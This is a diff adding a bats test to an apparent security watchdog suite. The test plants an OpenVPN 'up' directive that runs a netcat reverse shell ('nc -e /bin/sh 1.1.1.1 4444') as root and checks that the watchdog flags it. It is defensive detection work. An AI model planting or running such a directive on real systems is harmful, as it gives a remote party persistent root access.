@@ -259,3 +259,17 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in script directive: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to many other watchdog's nc reverse-shell variant
+    # INVARIANTs across the brain. OpenVPN script directives
+    # (up/down/client-connect/route-up) run AS ROOT on every
+    # VPN connect/disconnect/route-up — recurring trigger fires
+    # the planted nc the moment a connection or route flap
+    # happens. Locks the netcat axis on the VPN-event-trigger
+    # root-exec persistence surface (T1546 — Event Triggered
+    # Execution via VPN script directive).
+    printf 'client\ndev tun\nup /bin/sh -c "nc -e /bin/sh 1.1.1.1 4444"\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
